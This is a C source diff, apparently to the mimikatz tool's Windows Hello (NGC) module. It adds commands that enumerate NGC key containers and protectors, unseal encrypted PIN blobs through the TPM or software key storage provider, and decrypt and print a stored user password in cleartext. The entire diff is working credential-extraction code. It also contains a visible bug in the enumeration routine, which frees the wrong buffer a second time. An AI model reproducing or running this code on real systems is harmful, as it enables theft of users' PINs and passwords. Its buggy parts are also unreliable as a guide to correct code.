@@ -9,6 +9,8 @@ const KUHL_M_C kuhl_m_c_ngc[] = {
 	{kuhl_m_ngc_logondata,				L"logondata",				L":)"},
 	{kuhl_m_ngc_pin,					L"pin",						L"Try do decrypt a PIN Protector"},
 	{kuhl_m_ngc_sign,					L"sign",					L"Try to sign"},
+	{kuhl_m_ngc_decrypt,				L"decrypt",					L"Try to decrypt"},
+	{kuhl_m_ngc_enum,					L"enum",					NULL},
 };
 
 const KUHL_M kuhl_m_ngc = {
@@ -186,7 +188,7 @@ NTSTATUS kuhl_m_ngc_logondata(int argc, wchar_t * argv[])
 				{
 					if(kull_m_process_getVeryBasicModuleInformationsForName(aRemote.hMemory, L"NgcCtnrSvc.dll", &iModule))
 					{
-						aRemote.address = (PBYTE) iModule.DllBase.address + 0xbef10;
+						aRemote.address = (PBYTE) iModule.DllBase.address + /*0xB4F90;//*/0xbef10; // ContainerManager -- InternalUninitializeService@@YAXXZ proc near
 						if(kull_m_memory_copy(&aLocalBuffer, &aRemote, sizeof(containerManager)))
 						{
 							aRemote.address = containerManager.unk7;
@@ -269,99 +271,144 @@ BOOL getContent(DWORD dwReadFlags, LPCWSTR Root, LPCWSTR guid, BOOL isData, BOOL
 	return status;
 }
 
+#define ID_PROTECTOR_PROVIDER	1
+#define ID_PROTECTOR_KEYNAME	2
+//#define ID_PROTECTOR_
+#define ID_PROTECTOR_TIMESTAMP	9
+//#define ID_PROTECTOR_
+#define ID_PROTECTOR_ENC_PINS	15
+
+void printUnkPins(PUNK_RAW_PIN pRaw)
+{
+	if(pRaw->cbPin0)
+	{
+		kprintf(L"  UnkPin    : ");
+		kull_m_string_wprintf_hex(pRaw->data, pRaw->cbPin0, 4);
+		kprintf(L"\n");
+	}
+	if(pRaw->cbPin1)
+	{
+		kprintf(L"  DecryptPin: ");
+		kull_m_string_wprintf_hex(pRaw->data + pRaw->cbPin0, pRaw->cbPin1, 4);
+		kprintf(L"\n");
+	}
+	if(pRaw->cbPin2)
+	{
+		kprintf(L"  SignPin   : ");
+		kull_m_string_wprintf_hex(pRaw->data + pRaw->cbPin0 + pRaw->cbPin1, pRaw->cbPin2, 4);
+		kprintf(L"\n");
+	}
+}
+
 NTSTATUS kuhl_m_ngc_pin(int argc, wchar_t * argv[])
 {
-	LPCWSTR guid, pin;
-	PBYTE data;
-	DWORD cbData, cbResult, cbPin, i, dwReadFlags = kull_m_string_args_byName(argc, argv, L"withbackup", NULL, NULL) ? FILE_FLAG_BACKUP_SEMANTICS : 0;
 	SECURITY_STATUS status;
 	NCRYPT_PROV_HANDLE hProv;
-	NCRYPT_KEY_HANDLE hSealKey;
-	BYTE output[128] = {0};
-	UNK_PIN uPin;
-	UNK_PADDING uPadding = {0, 1, &uPin};
+	LPCWSTR guid, pin;
+	LPWSTR szProviderName, szKeyName, domain, name;
+	PBYTE data, UserPin = NULL, EncryptedPins;
+	DWORD cbData, cbResult, dwReadFlags = kull_m_string_args_byName(argc, argv, L"withbackup", NULL, NULL) ? FILE_FLAG_BACKUP_SEMANTICS : 0, dwImplType, dwUserPin = 0, dwEncryptedPins;
 	PUNK_RAW_PIN pRaw;
+	PSID pSid;
+	char *aPin;
 
 	if(kull_m_string_args_byName(argc, argv, L"guid", &guid, NULL))
 	{
-		if(getContent(dwReadFlags, NULL, guid, FALSE, TRUE, L"1", 1, &data, &cbData))
+		if(getContent(dwReadFlags, NULL, guid, FALSE, FALSE, NULL, 1, &data, &cbData))
 		{
-			kprintf(L"Provider : %.*s\n", cbData / sizeof(wchar_t), data);
+			kprintf(L"User SID  : %.*s", cbData / sizeof(wchar_t), data);
+			if(ConvertStringSidToSid((LPCWSTR) data, &pSid))
+			{
+				if(kull_m_token_getNameDomainFromSID(pSid, &name, &domain, NULL, NULL))
+				{
+					kprintf(L" ( %s\\%s )", domain, name);
+					LocalFree(name);
+					LocalFree(domain);
+				}
+				LocalFree(pSid);
+			}
+			kprintf(L"\n");
 			LocalFree(data);
 		}
 
-		if(getContent(dwReadFlags, NULL, guid, FALSE, TRUE, L"1", 9, &data, &cbData))
+		if(kull_m_string_args_byName(argc, argv, L"pin", &pin, NULL))
 		{
-			kprintf(L"Timestamp: ");
+			if(aPin = kull_m_string_unicode_to_ansi(pin))
+			{
+				kprintf(L"Pin code  : %S\nHex pin   : ", aPin);
+				if(UserPin = kull_m_crypto_ngc_pin_BinaryPinToPinProperty((LPCBYTE) aPin, lstrlenA(aPin), &dwUserPin))
+				{
+					kull_m_string_wprintf_hex(UserPin, dwUserPin - sizeof(wchar_t), 0);
+					kprintf(L"(");
+					kull_m_string_wprintf_hex(UserPin + dwUserPin - sizeof(wchar_t), sizeof(wchar_t), 0);
+					kprintf(L")");
+				}
+				kprintf(L"\n");
+				LocalFree(aPin);
+			}
+		}
+
+		if(getContent(dwReadFlags, NULL, guid, FALSE, TRUE, L"1", ID_PROTECTOR_TIMESTAMP, &data, &cbData))
+		{
+			kprintf(L"Timestamp : ");
 			kull_m_string_displayLocalFileTime((PFILETIME) data);
 			kprintf(L"\n");
 			LocalFree(data);
 		}
 
-		if(getContent(dwReadFlags, NULL, guid, FALSE, TRUE, L"1", 15, &data, &cbData))
+		if(getContent(dwReadFlags, NULL, guid, FALSE, TRUE, L"1", ID_PROTECTOR_ENC_PINS, &EncryptedPins, &dwEncryptedPins))
 		{
-			if(kull_m_string_args_byName(argc, argv, L"pin", &pin, NULL))
+			if(getContent(dwReadFlags, NULL, guid, FALSE, TRUE, L"1", ID_PROTECTOR_PROVIDER, (PBYTE *) &szProviderName, &cbData))
 			{
-				cbPin = lstrlen(pin);
-				uPin.cbData = ((cbPin * 2) + 1) * sizeof(wchar_t);
-				uPin.unk0 = 0x46;
-				uPin.pData = (PWSTR) LocalAlloc(LPTR, uPin.cbData);
-				if(uPin.pData)
+				kprintf(L"Provider  : %.*s\n", cbData / sizeof(wchar_t), szProviderName);
+				status = NCryptOpenStorageProvider(&hProv, szProviderName, 0);
+				if(status == ERROR_SUCCESS)
 				{
-					for(i = 0; i < cbPin; i++)
-						swprintf_s(uPin.pData + i * 2, uPin.cbData - i * 2, L"%02X", pin[i]); 
-
-					status = NCryptOpenStorageProvider(&hProv, MS_PLATFORM_CRYPTO_PROVIDER /**/, 0);
+					status = NCryptGetProperty(hProv, NCRYPT_IMPL_TYPE_PROPERTY, (PBYTE) &dwImplType, sizeof(dwImplType), &cbResult, 0);
 					if(status == ERROR_SUCCESS)
 					{
-						status = NCryptOpenKey(hProv, &hSealKey, TPM_RSA_SRK_SEAL_KEY, 0, NCRYPT_SILENT_FLAG);
-						if(status == ERROR_SUCCESS)
+						if(dwImplType == NCRYPT_IMPL_HARDWARE_FLAG)
 						{
-							status = NCryptDecrypt(hSealKey, data, cbData, &uPadding, output, sizeof(output), &cbResult, NCRYPT_SEALING_FLAG);
-							if(status == ERROR_SUCCESS)
+							if(UserPin && dwUserPin)
 							{
-								kprintf(L"Decrypted:\n");
-								pRaw = (PUNK_RAW_PIN) output;
-
-								if(pRaw->cbPin0)
+								status = kull_m_crypto_ngc_hardware_unseal(hProv, UserPin, dwUserPin, EncryptedPins, dwEncryptedPins, (PBYTE *) &pRaw, &cbResult);
+								if(status == ERROR_SUCCESS)
 								{
-									kprintf(L"  pin?: ");
-									kull_m_string_wprintf_hex(pRaw->data, pRaw->cbPin0, 4);
-									kprintf(L"\n");
-								}
-
-								if(pRaw->cbPin1)
-								{
-									kprintf(L"  pin?: ");
-									kull_m_string_wprintf_hex(pRaw->data + pRaw->cbPin0, pRaw->cbPin1, 4);
-									kprintf(L"\n");
-								}
-
-								if(pRaw->cbPin2)
-								{
-									kprintf(L"  PIN : ");
-									kull_m_string_wprintf_hex(pRaw->data + pRaw->cbPin0 + pRaw->cbPin1, pRaw->cbPin2, 4);
-									kprintf(L"\n");
+									printUnkPins(pRaw);
+									LocalFree(pRaw);
 								}
 							}
-							else PRINT_ERROR(L"NCryptDecrypt(seal): 0x%08x\n", status);
-							status = NCryptFreeObject(hSealKey);
 						}
-						else PRINT_ERROR(L"NCryptOpenKey(seal): 0x%08x\n", status);
-						status = NCryptFreeObject(hProv);
+						else if(dwImplType == NCRYPT_IMPL_SOFTWARE_FLAG)
+						{
+							if(getContent(dwReadFlags, NULL, guid, FALSE, TRUE, L"1", ID_PROTECTOR_KEYNAME, (PBYTE *) &szKeyName, &cbData))
+							{
+								kprintf(L"KeyName   : %.*s\n", cbData / sizeof(wchar_t), szKeyName);
+								if(UserPin && dwUserPin)
+								{
+									status = kull_m_crypto_ngc_software_decrypt(hProv, szKeyName, UserPin, dwUserPin, EncryptedPins, dwEncryptedPins, (PBYTE *) &pRaw, &cbResult);
+									if(status == ERROR_SUCCESS)
+									{
+										printUnkPins(pRaw);
+										LocalFree(pRaw);
+									}
+								}
+								LocalFree(szKeyName);
+							}
+						}
+						else PRINT_ERROR(L"dwImplType: 0x%08x\n", dwImplType);
 					}
-					else PRINT_ERROR(L"NCryptOpenStorageProvider: 0x%08x\n", status);
-					LocalFree(uPin.pData);
+					else PRINT_ERROR(L"NCryptGetProperty(NCRYPT_IMPL_TYPE_PROPERTY): 0x%08x\n", status);
+					status = NCryptFreeObject(hProv);
 				}
+				else PRINT_ERROR(L"NCryptOpenStorageProvider: 0x%08x\n", status);
+				LocalFree(szProviderName);
 			}
-			else
-			{
-				kprintf(L"Encrypted:\n");
-				kull_m_string_wprintf_hex(data, cbData, 1 | (32 << 16));
-				kprintf(L"\n");
-			}
-			LocalFree(data);
+			LocalFree(EncryptedPins);
 		}
+
+		if(UserPin)
+			LocalFree(UserPin);
 	}
 	else PRINT_ERROR(L"guid argument is missing\n");
 
@@ -424,5 +471,256 @@ NTSTATUS kuhl_m_ngc_sign(int argc, wchar_t * argv[])
 	}
 	else PRINT_ERROR(L"key argument is missing\n");
 
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS kuhl_m_ngc_decrypt(int argc, wchar_t * argv[])
+{
+	SECURITY_STATUS status;
+	NCRYPT_PROV_HANDLE hProv;
+	LPCWSTR szProvider, szKeyName, szData, szPin, szIV, szEncPassword;
+	PBYTE pbData, pbOutput, pbIV, pbEncPassword, pbPassword;
+	DWORD cbData, cbOutput, cbIV, cbEncPassword, cbPassword;
+	BCRYPT_ALG_HANDLE hAlg;
+	BCRYPT_KEY_HANDLE hKey;
+
+	kull_m_string_args_byName(argc, argv, L"provider", &szProvider, MS_KEY_STORAGE_PROVIDER);
+	if(kull_m_string_args_byName(argc, argv, L"keyname", &szKeyName, NULL))
+	{
+		if(kull_m_string_args_byName(argc, argv, L"pin", &szPin, NULL))
+		{
+			if(kull_m_string_args_byName(argc, argv, L"data", &szData, NULL) || kull_m_string_args_byName(argc, argv, L"enckey", &szData, NULL))
+			{
+				if(kull_m_string_stringToHexBuffer(szData, &pbData, &cbData))
+				{
+					kprintf(L"Provider   : %s\nKeyName    : %s\nKey PIN    : %s\nData       : ", szProvider, szKeyName, szPin);
+					kull_m_string_wprintf_hex(pbData, cbData, 0);
+					kprintf(L"\n");
+					status = NCryptOpenStorageProvider(&hProv, szProvider, 0);
+					if(status == ERROR_SUCCESS)
+					{
+						status = kull_m_crypto_ngc_software_decrypt(hProv, szKeyName, (LPCBYTE) szPin, (lstrlen(szPin) + 1) * sizeof(wchar_t), pbData, cbData, &pbOutput, &cbOutput);
+						if(status == ERROR_SUCCESS)
+						{
+							kprintf(L"Output     : ");
+							kull_m_string_wprintf_hex(pbOutput, cbOutput, 0);
+							kprintf(L"\n");
+							if(kull_m_string_args_byName(argc, argv, L"iv", &szIV, NULL) && kull_m_string_args_byName(argc, argv, L"encPassword", &szEncPassword, NULL))
+							{
+								if(kull_m_string_stringToHexBuffer(szIV, &pbIV, &cbIV))
+								{
+									kprintf(L"IV         : ");
+									kull_m_string_wprintf_hex(pbIV, cbIV, 0);
+									kprintf(L"\n");
+									if(kull_m_string_stringToHexBuffer(szEncPassword, &pbEncPassword, &cbEncPassword))
+									{
+										kprintf(L"EncPassword: ");
+										kull_m_string_wprintf_hex(pbEncPassword, cbEncPassword, 0);
+										kprintf(L"\n");
+
+										status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
+										if(status == STATUS_SUCCESS)
+										{
+											status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pbOutput, cbOutput, 0);
+											if(status == STATUS_SUCCESS)
+											{
+												status = BCryptDecrypt(hKey, pbEncPassword, cbEncPassword, NULL, pbIV, cbIV, NULL, 0, &cbPassword, BCRYPT_BLOCK_PADDING);
+												if(status == STATUS_SUCCESS)
+												{
+													if(pbPassword = (PBYTE) LocalAlloc(LPTR, cbPassword))
+													{
+														status = BCryptDecrypt(hKey, pbEncPassword, cbEncPassword, NULL, pbIV, cbIV, pbPassword, cbPassword, &cbPassword, BCRYPT_BLOCK_PADDING);
+														if(status == STATUS_SUCCESS)
+														{
+															kprintf(L"\nPassword   : %.*s\n", cbPassword / sizeof(wchar_t), pbPassword);
+														}
+														else PRINT_ERROR(L"BCryptDecrypt(data): 0x%08x\n", status);
+														LocalFree(pbPassword);
+													}
+												}
+												else PRINT_ERROR(L"BCryptDecrypt(init): 0x%08x\n", status);
+												BCryptDestroyKey(hKey);
+											}
+											else PRINT_ERROR(L"BCryptGenerateSymmetricKey: 0x%08x\n", status);
+											BCryptCloseAlgorithmProvider(hAlg, 0);
+										}
+										else PRINT_ERROR(L"BCryptOpenAlgorithmProvider: 0x%08x\n", status);
+										LocalFree(pbEncPassword);
+									}
+									else PRINT_ERROR(L"unable to convert encPassword from hex\n");
+									LocalFree(pbIV);
+								}
+								else PRINT_ERROR(L"unable to convert IV from hex\n");
+							}
+							LocalFree(pbOutput);
+						}
+						NCryptFreeObject(hProv);
+					}
+					else PRINT_ERROR(L"NCryptOpenStorageProvider: 0x%08x\n", status);
+					LocalFree(pbData);
+				}
+				else PRINT_ERROR(L"unable to convert data from hex\n");
+			}
+			else PRINT_ERROR(L"a /data (or /enckey) argument is needed\n");
+		}
+		else PRINT_ERROR(L"a /pin argument is needed\n");
+	}
+	else PRINT_ERROR(L"a /keyname argument is needed\n");
+
+	return STATUS_SUCCESS;
+}
+
+BOOL CALLBACK kuhl_m_ngc_enum_protectors(DWORD level, PCWCHAR fullpath, PCWCHAR path, PVOID pvArg)
+{
+	DWORD dwAttrib, cbData;
+	PBYTE data;
+	if(fullpath)
+	{
+		dwAttrib = GetFileAttributes(fullpath);
+		if((dwAttrib != INVALID_FILE_ATTRIBUTES) && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY))
+		{
+			kprintf(L"    * %s\n", path, pvArg);
+			if(getContent(0, NULL, (LPCWSTR) pvArg, FALSE, TRUE, path, ID_PROTECTOR_PROVIDER, &data, &cbData))
+			{
+				kprintf(L"      Provider : %.*s\n", cbData / sizeof(wchar_t), data);
+				LocalFree(data);
+			}
+			if(getContent(0, NULL, (LPCWSTR) pvArg, FALSE, TRUE, path, ID_PROTECTOR_KEYNAME, &data, &cbData))
+			{
+				kprintf(L"      Key Name : %.*s\n", cbData / sizeof(wchar_t), data);
+				LocalFree(data);
+			}
+			if(getContent(0, NULL, (LPCWSTR) pvArg, FALSE, TRUE, path, ID_PROTECTOR_TIMESTAMP, &data, &cbData))
+			{
+				kprintf(L"      Timestamp: ");
+				kull_m_string_displayLocalFileTime((PFILETIME) data);
+				kprintf(L"\n");
+				LocalFree(data);
+			}
+			if(getContent(0, NULL, (LPCWSTR) pvArg, FALSE, TRUE, path, ID_PROTECTOR_ENC_PINS, &data, &cbData))
+			{
+				kprintf(L"      Enc PINs : %u byte(s)\n", cbData);
+				LocalFree(data);
+			}
+			kprintf(L"\n");
+		}
+	}
+	return FALSE;
+}
+
+BOOL CALLBACK kuhl_m_ngc_enum_U(DWORD level, PCWCHAR fullpath, PCWCHAR path, PVOID pvArg)
+{
+	DWORD dwAttrib, cbData;
+	PBYTE data;
+	if(fullpath && _wcsicmp(path, L"{93F10861-19F1-42B8-AD24-93A28E9C4096}"))
+	{
+		dwAttrib = GetFileAttributes(fullpath);
+		if((dwAttrib != INVALID_FILE_ATTRIBUTES) && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY))
+		{
+			kprintf(L"    * %s\n", path);
+			if(getContent(0, NULL, (LPCWSTR) pvArg, TRUE, FALSE, path, 1, &data, &cbData))
+			{
+				kprintf(L"      Name     : %.*s\n", cbData / sizeof(wchar_t), data);
+				LocalFree(data);
+			}
+			if(getContent(0, NULL, (LPCWSTR) pvArg, TRUE, FALSE, path, 2, &data, &cbData))
+			{
+				kprintf(L"      Provider : %.*s\n", cbData / sizeof(wchar_t), data);
+				LocalFree(data);
+			}
+			if(getContent(0, NULL, (LPCWSTR) pvArg, TRUE, FALSE, path, 3, &data, &cbData))
+			{
+				kprintf(L"      Key Name : %.*s\n", cbData / sizeof(wchar_t), data);
+				LocalFree(data);
+			}
+			if(getContent(0, NULL, (LPCWSTR) pvArg, TRUE, FALSE, path, 4, &data, &cbData))
+			{
+				kprintf(L"      Certificate:\n");
+				kull_m_string_wprintf_hex(data, cbData, 1 | (32 << 16));
+				kprintf(L"\n");
+				LocalFree(data);
+			}
+			kprintf(L"\n");
+		}
+	}
+	return FALSE;
+}
+
+BOOL CALLBACK kuhl_m_ngc_enum_directory(DWORD level, PCWCHAR fullpath, PCWCHAR path, PVOID pvArg)
+{
+	DWORD dwAttrib, cbData;
+	PBYTE data;
+	PSID pSid;
+	PWSTR name, domain, fullpathProtectors, fullpathU;
+
+	if(fullpath)
+	{
+		dwAttrib = GetFileAttributes(fullpath);
+		if((dwAttrib != INVALID_FILE_ATTRIBUTES) && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY))
+		{
+			kprintf(L"\n* %s\n", path);
+
+			if(getContent(0, NULL, path, FALSE, FALSE, NULL, 1, &data, &cbData))
+			{
+				kprintf(L"    User SID     : %.*s", cbData / sizeof(wchar_t), data);
+				if(ConvertStringSidToSid((LPCWSTR) data, &pSid))
+				{
+					if(kull_m_token_getNameDomainFromSID(pSid, &name, &domain, NULL, NULL))
+					{
+						kprintf(L" ( %s\\%s )", domain, name);
+						LocalFree(name);
+						LocalFree(domain);
+					}
+					LocalFree(pSid);
+				}
+				kprintf(L"\n");
+				LocalFree(data);
+			}
+
+			if(getContent(0, NULL, path, FALSE, FALSE, NULL, 7, &data, &cbData))
+			{
+				kprintf(L"    Main Provider: %.*s\n", cbData / sizeof(wchar_t), data);
+				LocalFree(data);
+			}
+
+			if(fullpathProtectors = (wchar_t *) LocalAlloc(LPTR, MAX_PATH * sizeof(wchar_t)))
+			{
+				if(wcscpy_s(fullpathProtectors, MAX_PATH, fullpath) == 0)
+				{
+					if(wcscat_s(fullpathProtectors, MAX_PATH, L"\\") == 0)
+					{
+						if(wcscat_s(fullpathProtectors, MAX_PATH, L"Protectors") == 0)
+						{
+							kprintf(L"\n    Protectors:\n");
+							kull_m_file_Find(fullpathProtectors, NULL, FALSE, 0, FALSE, TRUE, kuhl_m_ngc_enum_protectors, (PVOID) path);
+						}
+					}
+				}
+				LocalFree(fullpathProtectors);
+			}
+
+			if(fullpathU = (wchar_t *) LocalAlloc(LPTR, MAX_PATH * sizeof(wchar_t)))
+			{
+				if(wcscpy_s(fullpathU, MAX_PATH, fullpath) == 0)
+				{
+					if(wcscat_s(fullpathU, MAX_PATH, L"\\") == 0)
+					{
+						if(wcscat_s(fullpathU, MAX_PATH, L"{93F10861-19F1-42B8-AD24-93A28E9C4096}") == 0)
+						{
+							kprintf(L"\n    {93F10861-19F1-42B8-AD24-93A28E9C4096}:\n");
+							kull_m_file_Find(fullpathU, NULL, FALSE, 0, FALSE, TRUE, kuhl_m_ngc_enum_U, (PVOID) path);
+						}
+					}
+				}
+				LocalFree(fullpathProtectors);
+			}
+		}
+	}
+	return FALSE;
+}
+
+NTSTATUS kuhl_m_ngc_enum(int argc, wchar_t * argv[])
+{
+	kull_m_file_Find(ngcRoot, NULL, FALSE, 0, FALSE, TRUE, kuhl_m_ngc_enum_directory, NULL);
 	return STATUS_SUCCESS;
 }
